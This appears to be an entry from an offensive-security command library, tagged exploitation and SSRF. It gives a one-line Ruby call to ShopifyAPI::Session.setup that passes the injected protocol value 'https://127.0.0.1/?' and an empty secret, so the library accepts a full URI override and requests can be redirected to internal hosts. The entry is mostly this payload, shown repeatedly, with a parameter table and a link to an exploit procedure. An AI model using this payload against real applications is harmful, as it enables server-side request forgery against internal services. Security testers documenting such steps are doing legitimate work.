---
id: cmd-setup-malicious-protocol-001
data: 'ShopifyAPI::Session.setup protocol:''https://127.0.0.1/?'',secret:'''''
tags:
  - exploitation
  - ssrf
type: command
output: Configuration applied
executor: ruby
platforms:
  - Ruby
created_at: '2023-10-01T00:00:00Z'
updated_at: '2025-12-14T17:32:28.620Z'
verified: false
validated: true
submitted: true
---
---

# setup-session-malicious-protocol

## Command

```ruby
ShopifyAPI::Session.setup protocol:'https://127.0.0.1/?',secret:''
```

## Description

Configures Session with malicious protocol URI to enable full URI override for SSRF.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| protocol | Malicious URI 'https://127.0.0.1/?' | Yes |
| secret | Empty string | Yes |

## Examples

### Basic Usage

```ruby
ShopifyAPI::Session.setup protocol:'https://127.0.0.1/?',secret:''
```

## Expected Output

Configuration applied, leading to SSRF.

## Related

- [[commands/request-access-token]]
- [[procedures/Exploit-Protocol-Parameter-for-SSRF]]

---
